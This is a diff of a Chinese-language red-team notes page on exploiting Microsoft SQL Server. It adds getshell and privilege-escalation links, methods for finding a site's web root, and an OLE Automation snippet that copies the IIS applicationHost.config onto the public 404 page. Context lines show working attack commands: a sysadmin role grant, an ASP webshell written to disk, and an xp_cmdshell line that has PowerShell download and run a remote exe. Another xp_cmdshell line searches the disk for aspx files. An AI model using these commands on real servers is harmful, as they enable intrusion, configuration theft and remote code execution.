@@ -2,13 +2,16 @@
 
 > fofa : app="Microsoft-SQL-Server"
 
-**注入**
+**MSSQL 基础**
+- [MSSQL](../../../../Integrated/数据库/笔记/MSSQL.md)
+
+**MSSQL 注入**
 - [MSSQL数据库注入笔记](../../Web安全/Web_Generic/SQLi.md#MSSQL)
 
 **环境搭建**
 - [MSSQL搭建](../../../../Integrated/Windows/实验/MSSQL搭建.md)
 
-**教程**
+**相关教程**
 - [aleenzz/MSSQL_SQL_BYPASS_WIKI](https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI)
 
 **相关文章**
@@ -29,6 +32,9 @@
 - [SQL Server 用扩展存储过程进行文件操作](https://www.cnblogs.com/ljhdo/archive/2018/02/23/4996060.html)
 - [MSSQL Lateral Movement](https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/)
 - [mssql 提权总结](https://tttang.com/archive/1545/)
+- [MSSQL GetShell方法](https://xz.aliyun.com/t/8603)
+- [MSSQL多种姿势拿shell和提权](https://y4er.com/post/mssql-getshell/)
+- [【红蓝对抗】SQL Server提权](https://mp.weixin.qq.com/s/5LmC_-KK3SMjtxAGG-I4ag)
 
 **相关案例**
 - [MSSQL绕过360提权实战案例](https://mp.weixin.qq.com/s/Ch342vyszfhUWSlkJEzMOA)
@@ -74,10 +80,17 @@ ALTER SERVER ROLE sysadmin ADD MEMBER f0x;
 sp_addsrvrolemember 'f0x', 'sysadmin'
 ```
 
-**查看用户**
+**查看用户和权限**
+
+05 以下系统权限多为 system
+
+08 以上系统权限默认不是 system 了，一般是 network service
+
 ```
 select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
 ```
+
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/29.png)
 
 ## 常见存储过程
 
@@ -202,6 +215,18 @@ EXEC xp_regdeletekey 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\Current
 - 拥有DBA权限
 - 知道的网站绝对路径
 
+找绝对路径的方法
+- 报错信息
+- 配置文件
+    - iis6 : C:\Windows\system32\inetsrv\metabase.xml
+    - iis7 : C:\Windows\System32\inetsrv\config\applicationHost.config
+- cmd命令搜索文件
+- 找旁站路径
+- xp_dirtree
+- xp_subdirs
+- 修改404页面
+- 爆破路径
+
 ```sql
 -- 判断当前是否为DBA权限，为1则可以提权
 select is_srvrolemember('sysadmin');
@@ -216,6 +241,27 @@ exec @ret = sp_oamethod @f, 'writeline', NULL,'<%execute(request("a"))%>'
 ![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/25.png)
 
 ![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/26.png)
+
+**修改404页面**
+
+> 来自文章 : https://xz.aliyun.com/t/8603
+
+适用于2005或者高权限启动的2008
+
+iis的报错页面一般都在 `C:\inetpub\custerr\zh-CN`
+```sql
+exec sp_configure 'show advanced options', 1;RECONFIGURE
+exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE
+declare @o int
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'copyfile',null,'C:\Windows\System32\inetsrv\config\applicationHost.config' ,'C:\inetpub\custerr\zh-CN\404.htm';
+```
+
+在访问 404 即可查看到配置文件的内容.
+
+如果是 05 的数据库要修改配置文件路径
+- iis6 404页面位置 : C:\WINDOWS\Help\iisHelp\common\404b.htm
+- iis6 配置文件 : C:\Windows\system32\inetsrv\metabase.xml
 
 ## 差异备份写webshell
 
@@ -248,10 +294,10 @@ backup database test to disk='C:\www\shell.asp' WITH DIFFERENTIAL,FORMAT;
 
 优势：
 - 重复性好，多次备份的成功率高
-- 相对于差异备份而言，shell的体积较小
+- 相对于差异备份而言，shell 的体积较小
 
 利用条件：
-- 拥有DBA权限
+- 拥有 DBA 权限
 - 知道网站绝对路径，并且可写
 - 站库不分离
 - 数据库必须被备份过一次
@@ -326,6 +372,10 @@ exec master..xp_cmdshell 'cmd /c whoami'
 
 -- xp_cmdshell 调用cmd.exe用powershell 远程下载exe并执行
 exec master..xp_cmdshell '"echo $client = New-Object System.Net.WebClient > %TEMP%\test.ps1 & echo $client.DownloadFile("http://example/test0.exe","%TEMP%\test.exe") >> %TEMP%\test.ps1 & powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 & WMIC process call create "%TEMP%\test.exe""'
+
+-- 使用 xp_cmdshell 查找 aspx 后缀文件
+CREATE TABLE cmdtmp (dir varchar(8000));
+insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\ %i in (1*.aspx) do @echo %i'
 ```
 
 ![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/27.png)
